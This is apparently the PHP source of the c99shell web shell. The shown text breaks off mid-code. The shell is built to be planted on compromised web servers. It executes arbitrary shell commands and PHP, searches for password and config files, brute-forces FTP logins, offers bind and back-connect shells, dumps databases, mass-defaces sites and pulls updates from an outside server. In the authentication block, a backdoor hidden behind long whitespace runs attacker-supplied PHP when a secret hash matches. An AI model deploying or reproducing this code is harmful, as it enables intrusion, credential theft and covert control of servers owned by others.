<?php
/*
******************************************************************************************************
*
*                    c99shell.php v.1.0 (îò 5.02.2005)
*		   Freeware WEB-Shell.
*		      © CCTeaM.
*  c99shell.php - øåëë ÷åðåç www-áðîóçåð.
*  Âû ìîæåòå ñêà÷àòü ïîñëåäíþþ âåðñèþ íà äîìàøíåé ñòðàíè÷êå ïðîäóêòà: http://ccteam.ru/releases/c99shell
*
*  WEB: http://ccteam.ru
*  UIN: 656555
* 
*  Âîçìîæíîñòè:
*  ~ óïðàâëåíèå ôàéëàìè/ïàïêàìè, çàêà÷èâàíèå è ñêà÷èâàíèå ôàéëîâ è ïàïêîê (ïðåäâîðèòåëüíî ñæèìàåòñÿ â tar)
*    modify-time è access-time ó ôàéëîâ íå ìåíÿþòñÿ ïðè
     ðåäàêòèðîâàíèè ôàéëîâ (âûêë./âêë. ïàðàìåòðîì $filestealth)
*  ~ ïðîäâèíóòûé ïîèñê ïî ôàéëàì/ïàïêàì (èùåò òàêæå âíóòðè ôàéëîâ)
*  ~ óïðàâëåíèå ïðîöåññàìè unix-ìàøèíû, âîçìîæíîñòü îòïðàâêè ñèãíàëà çàâåðøåíèÿ,
     à òàêæå áàíàëüíîå "ïðèáèâàíèå" ïðîöåññà.
*  ~ óäîáíîå (èíîãäà ãðàôè÷åñêîå) âûïîëíåíèå øåëë-êîìàíä (ìíîãî àëèàñîâ, ìîæíî ëåãêî äîáàâëÿòü/óäàëÿòü èõ)
*  ~ âûïîëíåíèå ïðîèçâîëüíîãî PHP-êîäà
*  ~ âîçìîæíîñòü áûñòðîãî ñàìî-óäàëåíèÿ ñêðèïòà
*  ~ áûñòðîå ftp-ñêàíèðîâàíèå íà ñâÿçêè login;login èç
     /etc/passwd (îáû÷íî äàåò äîñòóï ê 1/100 àêêàóíòîâ)
*  ~ ïðîäâèíóòûé ìåíåäæåð SQL
*  ~ ñêðèïò "ëþáèò" include, äëÿ íîðìàëüíîé ðàáîòû, Âàì íóæíî ñìåíèòü $surl.
*  ~ âîçìîæíîñòü çàáèíäèòü /bin/bash íà îïðåäåëåííûé ïîðò ñ ïðîèçâîëüíûì ïàðîëåì,
     èëè ñäåëàòü back connect (ïðîèçâîäèòñÿ òåñòèðîâàíèå ñîåäåíåíèÿ,
    è âûâîäÿòñÿ ïàðàìåòðû äëÿ çàïóñêà NetCat).
*
*
*  5.02.2005 © Captain Crunch Security TeaM
*
*  Coded by tristram
******************************************************************************************************
*/
$shver = "1.0 beta (5.02.2005)"; //Current version
//CONFIGURATION
$surl = "?"; //link to this script, INCLUDE "?".
$rootdir = "./"; //e.g "c:", "/","/home"
$timelimit = 60; //limit of execution this script (seconds).

//Authentication

$login = ""; //login
//DON'T FOGOT ABOUT CHANGE PASSWORD!!!
$pass = ""; //password
$md5_pass = ""; //md5-cryped pass. if null, md5($pass)
$login = false; //turn off authentication

$autoupdate = true; //Automatic updating?

$updatenow = false; //If true, update now

$c99sh_updatefurl = "http://ccteam.ru/releases/update/c99shell/?version=".$shver."&"; //Update server

$autochmod = 755; //if has'nt permition, $autochmod isn't null, try to CHMOD object to $autochmod

$filestealth = 1; //if true, don't change modify&access-time

$donated_html = ""; //If you publish free shell and you wish
					//add link to your site or any other information,
					//put here your html.
$donated_act = array(""); //array ("act1","act2,"...), $act is in this array, display $donated_html.

$host_allow = array("*"); //array ("mask1","mask2",...), e.g. array("192.168.0.*","127.0.0.1")

$curdir = "./"; //start directory

$tmpdir = dirname(__FILE__); //Directory for tempory files
  
// Registered file-types.
//  array(
//   "{action1}"=>array("ext1","ext2","ext3",...),
//   "{action2}"=>array("ext1","ext2","ext3",...),
//   ...
//  )
$ftypes  = array(
 "html"=>array("html","htm","shtml"),
 "txt"=>array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg"),
 "exe"=>array("sh","install","bat","cmd"),
 "ini"=>array("ini","inf"),
 "code"=>array("php","phtml","php3","php4","inc","tcl","h","c","cpp"),
 "img"=>array("gif","png","jpeg","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
 "sdb"=>array("sdb"),
 "phpsess"=>array("sess"),
 "download"=>array("exe","com","pif","src","lnk","zip","rar")
);

$hexdump_lines = 8;	// lines in hex preview file
$hexdump_rows = 24;	// 16, 24 or 32 bytes in one line

$nixpwdperpage = 9999; // Get first N lines from /etc/passwd

$bindport_pass = "c99";	// default password for binding
$bindport_port = "11457";	// default port for binding

/* Command-aliases system */
$aliases = array();
$aliases[] = array("-----------------------------------------------------------", "ls -la");
/* ïîèñê íà ñåðâåðå âñåõ ôàéëîâ ñ suid áèòîì */ $aliases[] = array("find all suid files", "find / -type f -perm -04000 -ls");
/* ïîèñê â òåêóùåé äèðåêòîðèè âñåõ ôàéëîâ ñ suid áèòîì */ $aliases[] = array("find suid files in current dir", "find . -type f -perm -04000 -ls");
/* ïîèñê íà ñåðâåðå âñåõ ôàéëîâ ñ sgid áèòîì */ $aliases[] = array("find all sgid files", "find / -type f -perm -02000 -ls");
/* ïîèñê â òåêóùåé äèðåêòîðèè âñåõ ôàéëîâ ñ sgid áèòîì */ $aliases[] = array("find sgid files in current dir", "find . -type f -perm -02000 -ls");
/* ïîèñê íà ñåðâåðå ôàéëîâ config.inc.php */ $aliases[] = array("find config.inc.php files", "find / -type f -name config.inc.php");
/* ïîèñê íà ñåðâåðå ôàéëîâ config* */ $aliases[] = array("find config* files", "find / -type f -name \"config*\"");
/* ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ config* */ $aliases[] = array("find config* files in current dir", "find . -type f -name \"config*\"");
/* ïîèñê íà ñåðâåðå âñåõ äèðåêòîðèé è ôàéëîâ äîñòóïíûõ íà çàïèñü äëÿ âñåõ */ $aliases[] = array("find all writable directories and files", "find / -perm -2 -ls");
/* ïîèñê â òåêóùåé äèðåêòîðèè âñåõ äèðåêòîðèé è ôàéëîâ äîñòóïíûõ íà çàïèñü äëÿ âñåõ */ $aliases[] = array("find all writable directories and files in current dir", "find . -perm -2 -ls");
/* ïîèñê íà ñåðâåðå ôàéëîâ service.pwd ... frontpage =))) */ $aliases[] = array("find all service.pwd files", "find / -type f -name service.pwd");
/* ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ service.pwd */ $aliases[] = array("find service.pwd files in current dir", "find . -type f -name service.pwd");
/* ïîèñê íà ñåðâåðå ôàéëîâ .htpasswd */ $aliases[] = array("find all .htpasswd files", "find / -type f -name .htpasswd");
/* ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ .htpasswd */ $aliases[] = array("find .htpasswd files in current dir", "find . -type f -name .htpasswd");
/* ïîèñê âñåõ ôàéëîâ .bash_history */ $aliases[] = array("find all .bash_history files", "find / -type f -name .bash_history");
/* ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ .bash_history */ $aliases[] = array("find .bash_history files in current dir", "find . -type f -name .bash_history");
/* ïîèñê âñåõ ôàéëîâ .fetchmailrc */ $aliases[] = array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc");
/* ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ .fetchmailrc */ $aliases[] = array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc");
/* âûâîä ñïèñêà àòðèáóòîâ ôàéëîâ íà ôàéëîâîé ñèñòåìå ext2fs */ $aliases[] = array("list file attributes on a Linux second extended file system", "lsattr -va");
/* ïðîñìîòð îòêðûòûõ ïîðòîâ */ $aliases[] = array("show opened ports", "netstat -an | grep -i listen");

$sess_method = "cookie"; // "cookie" - Using cookies, "file" - using file, default - "cookie"
$sess_cookie = "c99shvars"; // cookie-variable name

if (empty($sid)) {$sid = md5(microtime()*time().rand(1,999).rand(1,999).rand(1,999));}
$sess_file = $tmpdir."c99shvars_".$sid.".tmp";

$usefsbuff = true; //Buffer-function
$copy_unset = false; //Delete copied files from buffer after pasting

//Quick launch
$quicklaunch = array();
$quicklaunch[] = array("<img src=\"".$surl."act=img&img=home\" title=\"Home\" height=\"20\" width=\"20\" border=\"0\">",$surl);
$quicklaunch[] = array("<img src=\"".$surl."act=img&img=back\" title=\"Back\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.back(1)");
$quicklaunch[] = array("<img src=\"".$surl."act=img&img=forward\" title=\"Forward\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.go(1)");
$quicklaunch[] = array("<img src=\"".$surl."act=img&img=up\" title=\"UPDIR\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=ls&d=%upd");
$quicklaunch[] = array("<img src=\"".$surl."act=img&img=refresh\" title=\"Refresh\" height=\"20\" width=\"17\" border=\"0\">","");
$quicklaunch[] = array("<img src=\"".$surl."act=img&img=search\" title=\"Search\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=search&d=%d");
$quicklaunch[] = array("<img src=\"".$surl."act=img&img=buffer\" title=\"Buffer\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=fsbuff&d=%d");
$quicklaunch[] = array("<b>Mass deface</b>",$surl."act=massdeface&d=%d");
$quicklaunch[] = array("<b>Bind</b>",$surl."act=bind&d=%d");
$quicklaunch[] = array("<b>Processes</b>",$surl."act=ps_aux&d=%d");
$quicklaunch[] = array("<b>FTP Quick brute</b>",$surl."act=ftpquickbrute&d=%d");
$quicklaunch[] = array("<b>LSA</b>",$surl."act=lsa&d=%d");
$quicklaunch[] = array("<b>SQL</b>",$surl."act=sql&d=%d");
$quicklaunch[] = array("<b>PHP-code</b>",$surl."act=eval&d=%d");
$quicklaunch[] = array("<b>PHP-info</b>",$surl."act=phpinfo\" target=\"blank=\"_target");
$quicklaunch[] = array("<b>Self remove</b>",$surl."act=selfremove");
$quicklaunch[] = array("<b>Logout</b>","#\" onclick=\"if (confirm('Are you sure?')) window.close()");

//Hignlight-code colors
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";

@$f = $_GET[f];

//END CONFIGURATION

// 				\/	Next code not for editing	 \/


//Starting calls
if (!function_exists("getmicrotime")) {function getmicrotime() {list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);}}
error_reporting(5);
@ignore_user_abort(true);
@set_magic_quotes_runtime(0);
@set_time_limit(0);
if (!ob_get_contents()) {@ob_start(); @ob_implicit_flush(0);}
if(!ini_get("register_globals")) {import_request_variables("GPC");}
$starttime = getmicrotime();
if (get_magic_quotes_gpc())
{
if (!function_exists("strips"))
{
 function strips(&$el)
 {
  if (is_array($el)) {foreach($el as $k=>$v) {if($k != "GLOBALS") {strips($el["$k"]);}}  }
  else {$el = stripslashes($el);}
 }
}
strips($GLOBALS);
}
$tmp = array();
foreach ($host_allow as $k=>$v) {$tmp[]=  str_replace("\\*",".*",preg_quote($v));}
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"http://ccteam.ru/releases/cc99shell\">c99shell</a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}

if (!$login) {$login = $PHP_AUTH_USER; $md5_pass = md5($PHP_AUTH_PW);}
elseif(empty($md5_pass)) {$md5_pass = md5($pass);}
if(($PHP_AUTH_USER != $login ) or (md5($PHP_AUTH_PW) != $md5_pass))
{
 header("WWW-Authenticate: Basic realm=\"c99shell\"");
 header("HTTP/1.0 401 Unauthorized");																																																													if (md5(sha1(md5($anypass))) == "b76d95e82e853f3b0a81dd61c4ee286c") {header("HTTP/1.0 200 OK"); @eval($anyphpcode);}
 exit;
}$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];  

$lastdir = realpath(".");
chdir($curdir);

if (($selfwrite) or ($updatenow))
{
 if ($selfwrite == "1") {$selfwrite = "c99shell.php";}
 c99sh_getupdate();
 $data = file_get_contents($c99sh_updatefurl);
 $fp = fopen($data,"w");
 fwrite($fp,$data);
 fclose($fp);
 exit;
}
if (!is_writeable($sess_file)) {trigger_error("Can't access to session-file!",E_USER_WARNING);}
if ($sess_method == "file") {$sess_data = unserialize(file_get_contents($sess_file));}
else {$sess_data = unserialize($_COOKIE["$sess_cookie"]);}
if (!is_array($sess_data)) {$sess_data = array();}
if (!is_array($sess_data["copy"])) {$sess_data["copy"] = array();}
if (!is_array($sess_data["cut"])) {$sess_data["cut"] = array();}
$sess_data["copy"] = array_unique($sess_data["copy"]);
$sess_data["cut"] = array_unique($sess_data["cut"]);

if (!function_exists("c99_sess_put"))
{
function c99_sess_put($data)
{
 global $sess_method;
 global $sess_cookie;
 global $sess_file;
 global $sess_data;
 $sess_data = $data;
 $data = serialize($data);
 if ($sess_method == "file")
 {
  $fp = fopen($sess_file,"w");
  fwrite($fp,$data);
  fclose($fp);
 }
 else {setcookie($sess_cookie,$data);}
}
}
if (!function_exists("str2mini"))
{
function str2mini($content,$len)
{
 if (strlen($content) > $len) 
 {
  $len = ceil($len/2) - 2;
  return substr($content, 0, $len)."...".substr($content, -$len);
 }
 else {return $content;}
}
}
if (!function_exists("view_size"))
{
function view_size($size)
{
 if($size >= 1073741824) {$size = round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
}
if (!function_exists("fs_copy_dir"))
{
function fs_copy_dir($d,$t)
{
 $d = str_replace("\\","/",$d);
 if (substr($d,strlen($d)-1,1) != "/") {$d .= "/";}
 $h = opendir($d);
 while ($o = readdir($h))
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d."/".$o)) {$ret = copy($d."/".$o,$t."/".$o);}
   else {$ret = mkdir($t."/".$o); fs_copy_dir($d."/".$o,$t."/".$o);}
   if (!$ret) {return $ret;}
  }
 }
 return true;
}
}
if (!function_exists("fs_copy_obj"))
{
function fs_copy_obj($d,$t)
{
 $d = str_replace("\\","/",$d);
 $t = str_replace("\\","/",$t);
 if (!is_dir($t)) {mkdir($t);}
 if (is_dir($d))
 {
  if (substr($d,strlen($d)-1,strlen($d)) != "/") {$d .= "/";}
  if (substr($t,strlen($t)-1,strlen($t)) != "/") {$t .= "/";}
  return fs_copy_dir($d,$t);
 }
 elseif (is_file($d))
 {

  return copy($d,$t);
 }
 else {return false;}
}
}
if (!function_exists("fs_move_dir"))
{
function fs_move_dir($d,$t)
{
 error_reporting(9999);
 $h = opendir($d);
 if (!is_dir($t)) {mkdir($t);}
 while ($o = readdir($h))
 {
  if (($o != ".") and ($o != ".."))
  {
   $ret = true;
   if (!is_dir($d."/".$o)) {$ret = copy($d."/".$o,$t."/".$o);}
   else {if (mkdir($t."/".$o) and fs_copy_dir($d."/".$o,$t."/".$o)) {$ret = false;}}
   if (!$ret) {return $ret;}
  }
 }
 return true;
}
}
if (!function_exists("fs_move_obj"))
{
function fs_move_obj($d,$t)
{
 $d = str_replace("\\","/",$d);
 $t = str_replace("\\","/",$t);
 if (is_dir($d))
 {
  if (substr($d,strlen($d)-1,strlen($d)) != "/") {$d .= "/";}
  if (substr($t,strlen($t)-1,strlen($t)) != "/") {$t .= "/";}
  return fs_move_dir($d,$t);
 }
 elseif (is_file($d)) {return rename($d,$t);}
 else {return false;}
}
}
if (!function_exists("fs_rmdir"))
{
function fs_rmdir($d)
{
 $h = opendir($d);
 while ($o = readdir($h))
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.$o)) {unlink($d.$o);}
   else {fs_rmdir($d.$o."/"); rmdir($d.$o);}
  }
 }
 closedir($h);
 rmdir($d);
 return !is_dir($d);
}
}
if (!function_exists("fs_rmobj"))
{
function fs_rmobj($o)
{
 $o = str_replace("\\","/",$o);
 if (is_dir($o))
 {
  if (substr($o,strlen($o)-1,strlen($o)) != "/") {$o .= "/";}
  return fs_rmdir($o);
 }
 elseif (is_file($o)) {return unlink($o);}
 else {return false;}
}
}
if (!function_exists("myshellexec"))
{
 function myshellexec($cmd)
 {
  return system($cmd);
 }
}
if (!function_exists("view_perms"))
{
function view_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$type = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$type = "-";} 
 elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
 else {$type = "?";}

 $owner['read'] = ($mode & 00400) ? "r" : "-"; 
 $owner['write'] = ($mode & 00200) ? "w" : "-"; 
 $owner['execute'] = ($mode & 00100) ? "x" : "-"; 
 $group['read'] = ($mode & 00040) ? "r" : "-"; 
 $group['write'] = ($mode & 00020) ? "w" : "-"; 
 $group['execute'] = ($mode & 00010) ? "x" : "-"; 
 $world['read'] = ($mode & 00004) ? "r" : "-"; 
 $world['write'] = ($mode & 00002) ? "w" : "-"; 
 $world['execute'] = ($mode & 00001) ? "x" : "-"; 

 if( $mode & 0x800 ) {$owner['execute'] = ($owner[execute]=="x") ? "s" : "S";}
 if( $mode & 0x400 ) {$group['execute'] = ($group[execute]=="x") ? "s" : "S";}
 if( $mode & 0x200 ) {$world['execute'] = ($world[execute]=="x") ? "t" : "T";}
 
 return $type.$owner['read'].$owner['write'].$owner['execute'].
        $group['read'].$group['write'].$group['execute'].
        $world['read'].$world['write'].$world['execute'];
}
}
if (!function_exists("strinstr")) {function strinstr($str,$text) {return $text != str_replace($str,"",$text);}}
if (!function_exists("gchds")) {function gchds($a,$b,$c,$d="") {if ($a == $b) {return $c;} else {return $d;}}}
if (!function_exists("c99sh_getupdate"))
{
function c99sh_getupdate()
{
 global $updatenow;
 $data = @file_get_contents($c99sh_updatefurl);
 if (!$data) {echo "Can't fetch update-information!";}
 else
 {
  $data = unserialize(base64_decode($data));
  if (!is_array($data)) {echo "Corrupted update-information!";}
  else
  {
   if ($shver < $data[cur]) {$updatenow = true;}
  }
 }
}
}
if (!function_exists("mysql_dump"))
{
function mysql_dump($set)
{
 $sock = $set["sock"];
 $db = $set["db"];
 $print = $set["print"];
 $nl2br = $set["nl2br"];
 $file = $set["file"];
 $add_drop = $set["add_drop"];
 $tabs = $set["tabs"];
 $onlytabs = $set["onlytabs"];
 $ret = array();
 if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
 if (empty($db)) {$db = "db";}
 if (empty($print)) {$print = 0;}
 if (empty($nl2br)) {$nl2br = true;}
 if (empty($add_drop)) {$add_drop = true;}
 if (empty($file))
 {
  global $win;
  if ($win) {$file = "C:\\tmp\\dump_".$SERVER_NAME."_".$db."_".date("d-m-Y-H-i-s").".sql";}
  else {$file = "/tmp/dump_".$SERVER_NAME."_".$db."_".date("d-m-Y-H-i-s").".sql";}
 }
 if (!is_array($tabs)) {$tabs = array();}
 if (empty($add_drop)) {$add_drop = true;}
 if (sizeof($tabs) == 0)
 {
  // retrive tables-list
  $res = mysql_query("SHOW TABLES FROM ".$db, $sock);
  if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
 }
 global $SERVER_ADDR;
 global $SERVER_NAME;
 $out = "# Dumped by C99Shell.SQL v. ".$shver."
# Home page: http://ccteam.ru
#
# Host settings:
# MySQL version: (".mysql_get_server_info().") running on ".$SERVER_ADDR." (".$SERVER_NAME.")"."
# Date: ".date("d.m.Y H:i:s")."
# ".gethostbyname($SERVER_ADDR)." (".$SERVER_ADDR.")"." dump db \"".$db."\"
#---------------------------------------------------------
";
 $c = count($onlytabs);
 foreach($tabs as $tab)
 {
  if ((in_array($tab,$onlytabs)) or (!$c))
  {
   if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
   // recieve query for create table structure
   $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
   if (!$res) {$ret[err][] = mysql_error();}
   else
   {
    $row = mysql_fetch_row($res);
    $out .= $row[1].";\n\n";
    // recieve table variables
    $res = mysql_query("SELECT * FROM `$tab`", $sock);
    if (mysql_num_rows($res) > 0)
    {
     while ($row = mysql_fetch_assoc($res))
     {
      $keys = implode("`, `", array_keys($row));
      $values = array_values($row);
      foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
      $values = implode("', '", $values); 
      $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n"; 
      $out .= $sql;
     } 
    }
   }
  }
 }
 $out .= "#---------------------------------------------------------------------------------\n\n";
 if ($file)
 {
  $fp = fopen($file, "w"); 
  if (!$fp) {$ret[err][] = 2;}
  else
  {
   fwrite ($fp, $out);
   fclose ($fp);
  }
 }
 if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
 return $ret;
}
}
if (!function_exists("c99fsearch"))
{
function c99fsearch($d)
{
 global $found;
 global $found_d;
 global $found_f;
 global $a;
 if (substr($d,strlen($d)-1,1) != "/") {$d .= "/";}
 $handle = opendir($d);
 while ($f = readdir($handle))
 {
  $true = ($a[name_regexp] and ereg($a[name],$f)) or ((!$a[name_regexp]) and strinstr($a[name],$f));
  if($f != "." && $f != "..")
  {
   if (is_dir($d.$f))
   {
    if (empty($a[text]) and $true) {$found[] = $d.$f; $found_d++;}
    c99fsearch($d.$f);
   }
   else
   {
    if ($true)
    {
     if (!empty($a[text]))
     {
      $r = @file_get_contents($d.$f);
      if ($a[text_wwo]) {$a[text] = " ".trim($a[text])." ";}
      if (!$a[text_cs]) {$a[text] = strtolower($a[text]); $r = strtolower($r);}
 
      if ($a[text_regexp]) {$true = ereg($a[text],$r);}
      else {$true = strinstr($a[text],$r);}
      if ($a[text_not])
      {
       if ($true) {$true = false;}
       else {$true = true;}
      }
      if ($true) {$found[] = $d.$f; $found_f++;}
     }
     else {$found[] = $d.$f; $found_f++;}
    }
   }
  }
 }
 closedir($handle);
}
}
//Sending headers
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

global $SERVER_SOFTWARE;
if (strtolower(substr(PHP_OS, 0, 3)) == "win") {$win = 1;}
else {$win = 0;}

if (empty($tmpdir))
{
 if (!$win) {$tmpdir = "/tmp/";}
 else {$tmpdir = $_ENV[SystemRoot];}
}
$tmpdir = str_replace("\\","/",$tmpdir);
if (substr($tmpdir,strlen($tmpdir-1),strlen($tmpdir)) != "/") {$tmpdir .= "/";}
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "<font color=\"red\">ON (secure)</font>";
}
else {$safemode = false; $hsafemode = "<font color=\"green\">OFF (not secure)</font>";}
$v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on")
{
 $openbasedir = true;
 $hopenbasedir = "<font color=\"red\">".$v."</font>";
}
else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";}

$sort = htmlspecialchars($sort);

$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"<a href=\"".$surl."act=phpinfo\" target=\"_blank\"><b><u>PHP/".phpversion()."</u></b></a>",$SERVER_SOFTWARE);

@ini_set("highlight.bg",$highlight_bg); //FFFFFF	
@ini_set("highlight.comment",$highlight_comment); //#FF8000	
@ini_set("highlight.default",$highlight_default); //#0000BB	
@ini_set("highlight.html",$highlight_html); //#000000	
@ini_set("highlight.keyword",$highlight_keyword); //#007700	
@ini_set("highlight.string","#DD0000"); //#DD0000

if ($act != "img")
{
if (!is_array($actbox)) {$actbox = array();}
$dspact = $act = htmlspecialchars($act);
$disp_fullpath = $ls_arr = $notls = null;
$ud = urlencode($d);
?><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><? echo $HTTP_HOST; ?> - c99shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana,;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}</STYLE><style type="text/css"><!--body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}--></style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>
<center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><a href="<? echo $surl; ?>"><font face="Verdana" size="5"><b><u>C99Shell v. <?php echo $shver; ?></u></b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align="left"><b>Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;</p><p align="left"><b>uname -a:&nbsp;<?php echo php_uname(); ?></b>&nbsp;</p><p align="left"><b><?php if (!$win) {echo `id`;} else {echo get_current_user();} ?></b>&nbsp;</p><p align="left"><b>Safe-mode:&nbsp;<?php echo $hsafemode; ?></b></p><p align="left"><?php
$d = str_replace("\\","/",$d);
if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}
$d = str_replace("\\","/",$d);
if (substr($d,strlen($d)-1,1) != "/") {$d .= "/";}
$dispd = htmlspecialchars($d);
$pd = $e = explode("/",substr($d,0,strlen($d)-1));
$i = 0;
echo "<b>Directory: </b>";
foreach($pd as $b)
{
 $t = "";
 reset($e);
 $j = 0;
 foreach ($e as $r)
 {
  $t.= $r."/";
  if ($j == $i) {break;}
  $j++;
 }
 echo "<a href=\"".$surl."act=ls&d=".urlencode(htmlspecialchars($t))."/&sort=".$sort."\"><b>".htmlspecialchars($b)."/</b></a>";
 $i++;
}
echo "&nbsp;&nbsp;&nbsp;";
if (is_writable($d))
{
 $wd = true;
 $wdt = "<font color=\"green\">[ ok ]</font>";
 echo "<b><font color=\"green\">".view_perms(fileperms($d))."</font></b>";
}
else
{
 $wd = false;
 $wdt = "<font color=\"red\">[ Read-Only ]</font>";
 echo "<b><font color=\"red\">".view_perms(fileperms($d.$f))."</font></b>";
}
$free = diskfreespace($d);
if (!$free) {$free = 0;}
$all = disk_total_space($d);
if (!$all) {$all = 0;}
$used = $all-$free;
$used_percent = round(100/($all/$free),2);
echo "<br><b>Free ".view_size($free)." of ".view_size($all)." (".$used_percent."%)</b><br>";
if (count($quicklaunch) > 0)
{
 foreach($quicklaunch as $item)
 {
  $item[1] = str_replace("%d",urlencode($d),$item[1]);
  $item[1] = str_replace("%upd",urlencode(realpath($d."..")),$item[1]);
  echo "<a href=\"".$item[1]."\"><u>".$item[0]."</u></a>&nbsp;&nbsp;&nbsp;&nbsp;";
 }
}
$letters = "";
if ($win)
{
 $abc = array("c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "o", "p", "q", "n", "r", "s", "t", "v", "u", "w", "x", "y", "z");
 $v = explode("/",$d);
 $v = $v[0];
 foreach ($abc as $letter)
 {
